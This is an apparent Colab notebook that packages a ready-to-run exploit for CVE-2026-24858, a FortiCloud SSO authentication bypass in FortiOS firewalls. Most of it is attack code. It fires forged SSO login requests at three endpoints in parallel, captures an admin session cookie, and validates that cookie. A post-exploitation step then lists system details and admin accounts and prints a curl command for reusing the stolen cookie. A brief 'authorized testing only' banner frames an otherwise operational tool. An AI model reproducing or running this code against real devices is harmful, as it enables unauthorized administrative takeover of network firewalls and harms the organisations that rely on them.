# CVE-2026-24858: FortiCloud SSO Authentication Bypass
## Google Colab Exploitation Notebook

**Vulnerability:** FortiCloud SSO Authentication Bypass  
**CVSS Score:** 9.8 (Critical)  
**Affects:** FortiOS 7.x - 8.1.x (when FortiCloud SSO enabled)  
**Status:** Actively exploited in the wild (Jan 2026)  

---

### ⚠️ AUTHORIZATION REMINDER
**This notebook is for AUTHORIZED SECURITY TESTING ONLY.**  
Unauthorized access to computer systems is ILLEGAL.  
Use only on systems you own or have explicit permission to test (lab environments).

---

## STEP 1: Install Dependencies

In [ ]:
import subprocess
import sys

print("[*] Installing dependencies...")
subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "requests", "urllib3"])
print("[✓] Dependencies installed")

## STEP 2: Import & Setup

In [ ]:
import requests
import json
import warnings
import time
from datetime import datetime
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

print("[✓] Imports successful")
print(f"[*] Running in Colab environment: {sys.platform}")

## STEP 3: Exploit Code

In [ ]:
class FortiOS8ColabExploit:
    """CVE-2026-24858 exploitation in Google Colab"""

    def __init__(self, target_ip: str, target_port: int = 443, verbose: bool = True):
        self.target_ip = target_ip
        self.target_port = target_port
        self.verbose = verbose
        self.base_url = f"https://{target_ip}:{target_port}"
        self.session = requests.Session()
        self.session.verify = False

    def log(self, level: str, msg: str):
        """Simple logging with emoji"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        symbols = {
            'INFO': '🔵',
            'SUCCESS': '✅',
            'ERROR': '❌',
            'WARNING': '⚠️',
            'DEBUG': '🔍'
        }
        symbol = symbols.get(level, '•')
        print(f"{symbol} [{timestamp}] {msg}")

    def exploit_json_api(self, serial: str, jwt_token: str, username: str = "admin") -> dict:
        """FortiOS 8.x JSON API exploitation"""
        result = {
            'vector': 'JSON_API',
            'endpoint': '/api/v1/auth/forticloud',
            'success': False,
            'status_code': None,
            'cookie': None,
            'response_time': 0
        }

        start_time = time.time()

        try:
            endpoint = urljoin(self.base_url, '/api/v1/auth/forticloud')
            payload = {
                "action": "forticloud_login",
                "username": username,
                "serial": serial,
                "token": jwt_token,
                "token_type": "jwt",
                "request_id": f"colab_{int(time.time())}",
                "client_type": "gui"
            }

            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'FortiGate/8.0.0 SSO',
                'Accept': 'application/json'
            }

            response = requests.post(
                endpoint,
                json=payload,
                headers=headers,
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code
            result['response_time'] = time.time() - start_time

            if response.status_code == 200:
                try:
                    resp_data = response.json()
                    if resp_data.get('status') == 'success':
                        result['success'] = True
                except:
                    pass

                if 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']
                    result['success'] = True

        except Exception as e:
            if self.verbose:
                self.log('DEBUG', f"JSON API error: {e}")

        return result

    def exploit_mobile_api(self, serial: str, jwt_token: str, username: str = "admin") -> dict:
        """FortiOS 8.x Mobile API (less protected)"""
        result = {
            'vector': 'MOBILE_API',
            'endpoint': '/api/v1/cmdb/system',
            'success': False,
            'status_code': None,
            'cookie': None
        }

        try:
            endpoint = urljoin(self.base_url, '/api/v1/cmdb/system')
            payload = {
                "action": "authenticate",
                "method": "forticloud",
                "device_serial": serial,
                "access_token": jwt_token,
                "device_id": "colab_mobile"
            }

            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'FortiGate-Mobile/8.0.0'
            }

            response = requests.post(
                endpoint,
                json=payload,
                headers=headers,
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code

            if response.status_code in [200, 201]:
                result['success'] = True
                if 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']

        except Exception as e:
            if self.verbose:
                self.log('DEBUG', f"Mobile API error: {e}")

        return result

    def exploit_xml_soap(self, serial: str, jwt_token: str, username: str = "admin") -> dict:
        """FortiOS 7.x XML SOAP (backward compat)"""
        result = {
            'vector': 'XML_SOAP',
            'endpoint': '/remote/logincheck',
            'success': False,
            'status_code': None,
            'cookie': None
        }

        try:
            endpoint = urljoin(self.base_url, '/remote/logincheck')
            payload = f"""<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <login>
            <user>{username}</user>
            <serial>{serial}</serial>
            <forticloud_token>{jwt_token}</forticloud_token>
            <token_type>jwt</token_type>
            <auth_method>forticloud_sso</auth_method>
        </login>
    </soap:Body>
</soap:Envelope>"""

            headers = {
                'Content-Type': 'application/xml',
                'User-Agent': 'FortiGate/7.6.0'
            }

            response = requests.post(
                endpoint,
                data=payload,
                headers=headers,
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code

            if response.status_code == 200:
                if 'APSCOOKIE' in response.cookies:
                    result['cookie'] = response.cookies['APSCOOKIE']
                    result['success'] = True

        except Exception as e:
            if self.verbose:
                self.log('DEBUG', f"XML SOAP error: {e}")

        return result

    def validate_session(self, cookie: str) -> bool:
        """Validate if exploitation was successful"""
        try:
            self.session.cookies.set('FSESSIONID', cookie)
            response = self.session.get(
                urljoin(self.base_url, '/api/v2/monitor/system/status'),
                verify=False,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False

    def run_exploit(self, serial: str, jwt_token: str, username: str = "admin") -> dict:
        """Run parallel exploitation"""
        self.log('INFO', "Starting parallel exploitation...")

        vectors = [
            ('JSON_API', lambda: self.exploit_json_api(serial, jwt_token, username)),
            ('MOBILE_API', lambda: self.exploit_mobile_api(serial, jwt_token, username)),
            ('XML_SOAP', lambda: self.exploit_xml_soap(serial, jwt_token, username))
        ]

        all_results = []

        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = {executor.submit(func): name for name, func in vectors}
            for future in as_completed(futures):
                result = future.result()
                all_results.append(result)
                status = "✓" if result['success'] else "✗"
                self.log('INFO', f"{status} {result['vector']}: {result['status_code']}")

                if result['success']:
                    break

        successful = next((r for r in all_results if r.get('success')), None)

        if successful:
            self.log('SUCCESS', f"Exploitation successful via {successful['vector']}")
            self.log('INFO', f"Cookie: {successful['cookie'][:40]}...")

            if self.validate_session(successful['cookie']):
                self.log('SUCCESS', "Session validation: AUTHENTICATED ✓")
                return {
                    'success': True,
                    'vector': successful['vector'],
                    'cookie': successful['cookie'],
                    'status': 'authenticated'
                }

        self.log('ERROR', "Exploitation failed")
        return {
            'success': False,
            'results': all_results,
            'status': 'failed'
        }

print("[✓] Exploit class loaded")

## STEP 4: Input Target Information

Modify the values below with your lab target details:

In [ ]:
# ====== CONFIGURATION ======
# Modify these with your lab target details

TARGET_IP = "192.168.122.10"  # Change to your lab FortiGate IP
TARGET_PORT = 443             # HTTPS port
DEVICE_SERIAL = "FG-ABC-000000"  # Change to your device serial
JWT_TOKEN = "eyJhbGc..."      # Replace with real FortiCloud JWT token
ADMIN_USER = "admin"           # Target username

# ====== VALIDATION ======
print("\n" + "="*60)
print("TARGET CONFIGURATION")
print("="*60)
print(f"🎯 Target IP:      {TARGET_IP}")
print(f"🔌 Target Port:    {TARGET_PORT}")
print(f"📱 Device Serial:  {DEVICE_SERIAL}")
print(f"👤 Admin User:     {ADMIN_USER}")
print(f"🔑 JWT Token:      {JWT_TOKEN[:30]}..." if len(JWT_TOKEN) > 30 else f"🔑 JWT Token:      {JWT_TOKEN}")

# Validate
if not all([TARGET_IP, DEVICE_SERIAL, JWT_TOKEN]):
    print("\n❌ ERROR: Missing required fields!")
    print("Modify the values above and try again.")
else:
    print("\n✓ Configuration valid")

## STEP 5: Test Connectivity

In [ ]:
print("\n" + "="*60)
print("PRE-EXPLOITATION CHECKS")
print("="*60 + "\n")

exploit = FortiOS8ColabExploit(TARGET_IP, TARGET_PORT)

# Test connectivity
exploit.log('INFO', "Testing connectivity...")
try:
    response = requests.get(
        f"https://{TARGET_IP}:{TARGET_PORT}/",
        verify=False,
        timeout=5
    )
    exploit.log('SUCCESS', f"Target is reachable (HTTP {response.status_code})")
except requests.exceptions.Timeout:
    exploit.log('WARNING', "Target timeout (may still be vulnerable)")
except Exception as e:
    exploit.log('ERROR', f"Cannot reach target: {e}")
    print("\n❌ Check:")
    print("  1. Is lab network reachable from Colab?")
    print("  2. Is the FortiGate VM running?")
    print("  3. Try VPN/SSH tunnel if lab is isolated")

## STEP 6: Run Exploitation

In [ ]:
print("\n" + "="*60)
print("RUNNING EXPLOITATION")
print("="*60 + "\n")

result = exploit.run_exploit(
    serial=DEVICE_SERIAL,
    jwt_token=JWT_TOKEN,
    username=ADMIN_USER
)

print("\n" + "="*60)
print("RESULTS")
print("="*60)
print(json.dumps(result, indent=2))

## STEP 7: Post-Exploitation (If Successful)

In [ ]:
if result.get('success'):
    cookie = result['cookie']
    print("\n" + "="*60)
    print("POST-EXPLOITATION RECONNAISSANCE")
    print("="*60 + "\n")
    
    headers = {'Cookie': f'FSESSIONID={cookie}'}
    
    # Get system info
    print("📊 Fetching system information...")
    try:
        response = requests.get(
            f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/monitor/system/status',
            headers=headers,
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            info = response.json()['results'][0]
            print(f"\n✓ System Information:")
            print(f"  Version:      {info.get('version', 'N/A')}")
            print(f"  Serial:       {info.get('serial', 'N/A')}")
            print(f"  Hostname:     {info.get('hostname', 'N/A')}")
            print(f"  License:      {info.get('license_status', 'N/A')}")
    except Exception as e:
        print(f"✗ Error: {e}")
    
    # Get admin users
    print("\n👤 Fetching admin users...")
    try:
        response = requests.get(
            f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/cmdb/system/admin',
            headers=headers,
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            admins = response.json().get('results', [])
            print(f"\n✓ Found {len(admins)} admin accounts:")
            for admin in admins:
                privilege = admin.get('accprofile', 'unknown')
                print(f"  - {admin['name']:20} | Privilege: {privilege}")
    except Exception as e:
        print(f"✗ Error: {e}")
    
    print(f"\n" + "="*60)
    print("✅ EXPLOITATION SUCCESSFUL")
    print("="*60)
    print(f"\nAuthenticated Cookie: {cookie}")
    print(f"\nUse this cookie in subsequent requests:")
    print(f"  curl -k -b 'FSESSIONID={cookie}' \\")
    print(f"    https://{TARGET_IP}:{TARGET_PORT}/api/v2/...")
else:
    print("\n❌ EXPLOITATION FAILED")
    print("\nPossible reasons:")
    print("  - Device is patched")
    print("  - FortiCloud SSO is disabled")
    print("  - JWT token is invalid/expired")
    print("  - Device is not vulnerable")

---

## References

- **GitHub Repository:** https://github.com/netanelcyber/HAMIVTZAR
- **CVE Details:** CVE-2026-24858
- **Documentation:** See COLAB_GUIDE.md in repository

---

**Last Updated:** 2026-07-23  
**Status:** Lab-tested  
**Compliance:** Authorized testing only
